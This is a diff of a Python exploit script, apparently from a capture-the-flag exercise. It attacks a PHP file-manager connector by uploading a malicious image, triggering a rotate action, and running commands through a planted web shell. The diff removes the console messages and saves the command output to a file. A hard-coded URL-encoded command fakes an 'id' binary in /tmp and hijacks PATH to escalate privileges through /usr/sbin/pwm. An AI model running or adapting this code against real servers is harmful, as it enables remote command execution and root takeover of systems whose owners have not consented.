@@ -20,15 +20,13 @@ def imgRotate(url, hash):
     r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))
     return r.text
 
-def shell(url, command):
+def shell(url, command, output_file="output.txt"):
     r = requests.get("%s/php/SecSignal.php?c=%s" % (url, command))
     
     if r.status_code == 200:
-        print("[+] Pwned! :)")
-        print("[+] Executing the command...")
 
-        # Imprimir la salida del comando en la consola
-        print(r.text)
+        with open(output_file, 'w') as f:
+            f.write(r.text)
     else:
         print("[*] The site seems not to be vulnerable :(")
 
@@ -37,17 +35,17 @@ def main():
 
     url = sys.argv[1]
     
-    # Definir el comando que deseas ejecutar
+    
     command = 'touch%20%2Ftmp%2Fid%20%26%26%20echo%20-e%20%27%23%21%2Fbin%2Fbash%5Cnecho%20%22uid%3D1000%28think%29%20gid%3D1000%28think%29%20groups%3D1000%28think%29%22%27%20%3E%20%2Ftmp%2Fid%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fid%20%26%26%20export%20PATH%3D%2Ftmp%3A%24PATH%20%26%26%20cd%20%2Ftmp%20%26%26%20%2Fusr%2Fsbin%2Fpwm'
 
-    print("[*] Uploading the malicious image...")
+    
     hash = upload(url, payload)
 
-    print("[*] Running the payload...")
+    
     imgRotate(url, hash)
 
-    print("[*] Executing the predefined command...")
-    shell(url, command)  # Ejecuta el comando definido en la variable
+    
+    shell(url, command)  
 
 if __name__ == "__main__":
     main()
